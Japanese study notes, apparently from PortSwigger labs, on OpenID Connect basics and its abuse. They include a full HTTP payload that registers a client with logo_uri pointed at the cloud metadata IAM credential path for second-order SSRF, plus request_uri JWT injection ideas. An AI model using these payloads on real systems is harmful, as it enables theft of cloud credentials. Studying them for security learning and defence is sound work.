## OIDCの動きの基本

- 詳細：[How does OpenID Connect work?](https://portswigger.net/web-security/oauth/openid#how-does-openid-connect-work)

###### OIDCの役割

- Relying party(RP): 認証要求するアプリ。OAuthでいうクライアントアプリケーション
- End user: 認証を受けるユーザ。OAuthでいうリソースオーナ
- OpenID provider: OpenID ConnectをサポートするOAuthサービス

###### claimとscope

- claim: `key:value`の形式。リソースサーバ上の情報を表す。`"family_name":"kosi"`など
- scopeはOAuthと異なり標準化されている
	- `openid profile`
	- `openid email`など。
	- `openid`スコープ + 標準的なスコープ

###### id_tokenについて

- `response_type=id_token token`: IDトークンとアクセストークンが同時にクライアントへ
- `response_type=id_token code`: IDトークンと認可コードが〃

- JWT暗号署名で完全性を保証。署名検証のための公開鍵は`/.well-know/jwks.json`で公開されいている事が多い

## OIDC利用しているかの特定方法4つ

1. HTTP HistoryのFilterで`openid`スコープを検索しヒットするか？
2. OAuthサービスがOIDCをサポートしているか検証するために、リクエストのパラメタを書き換える
```http
response_type=code
```
	↓
```http
response_type=id_token
```
- エラーがなければサポートしていることがわかる

3. OAuthプロバイダの公開ドキュメントをみてOIDCサポートしていないか？
4. 以下のエンドポイントにアクセスしてみる
```
[oauth-hostname]/.well-known/openid-configuration
```

## OIDCの悪用

### Unprotected dynamic client registration(動的クライアント登録の未保護)

##### 基本概念

###### 動的クライアント登録とは

- OIDCがサポートしている可能性のある機能
- クライアントアプリケーションは自分自身を登録するために、特定のエンドポイントに対してPOSTリクエストを送信して自身に関する情報を送信する。
- 送信先は`/registration` 等のエンドポイント。エンドポイントは設定ファイルやドキュメントに記載してある事が普通
- 情報はJSON形式
- よく、`redirect_uris`といってリダイレクト先のホワイトリストの提出を求められる

###### 動的クライアント登録リクエスト例
```http
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```

###### 攻撃概要

- `Authorization: Bearer [token]`のような形式でクライアント自身を認証すればセキュア。そうでないなら脆弱
- 脆弱な場合、クライアントアプリケーションを攻撃者の指定した悪意あるものに指定して登録させることが可能になる。

- 攻撃者が悪意あるアプリケーションを登録する際に、上の例で`logo_uri`などに悪意あるURIを指定する
- OPが指定されたURIにアクセスする
- second-order SSRFへ繋がる
	- 通常のSSRFは攻撃者が直接サーバの脆弱性を介して内部にリクエストしようとするものだが、second-order SSRFではまずそれ自体は被害を出さないURIを注入し、後でサーバにアクセスしてもらう事で被害を出す攻撃

#### 攻撃ステップ

1. registrationエンドポイントに対して、`logo_uri`等にSSRF攻撃を仕掛けたいエンドポイントを指定する(`["https://example~]`はそのまま)
```http
POST /reg HTTP/1.1
Host: oauth-TARGET_NET
Content-Type: application/json
Content-Length: 206

{
"redirect_uris":["https://example.com"],
    "logo_uri" : "https://COLLABORATOR_DOMAIN",
	"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
	
}  
```

2. レスポンスに`"client_id":"ahC..."`の形式で記載のclient_idを入手する
3. SSRF攻撃対象のエンドポイントを指定したパラメタ(`logo_uri`)と関係のあるエンドポイントへリクエストをする
```http
GET /client/入手したclient_id/logo HTTP/2
```

### (実践無)参照による認可要求が可能(Allowing authorization requests by reference)

- [詳細](https://portswigger.net/web-security/oauth/openid#allowing-authorization-requests-by-reference)

- JWTを指す単一の`redirect_uri`を指す場合、`redirect_uri`を使ってSSRFが可能かも
- もしくは`redirect_uri`のURIパラメタ内にペイロードを注入できるかも

```json
{
  "iss": "your-client-id",
  "aud": "https://example.com",
  "response_type": "code",
  "redirect_uri": "[ここ]",
  "scope": "openid"
}
```

- このJWTのURLを`request_uri` パラメータに含めて認可リクエストを送信する
```
https://example.com/authorize?request_uri=https://your-app.com/jwt
```

###### 脆弱性の検出

1. 設定ファイルもしくはドキュメントに`request_uri_parameter_supported`オプションがあるか確認する
2. もしくは単純に`redirect_uri`を追加してみる
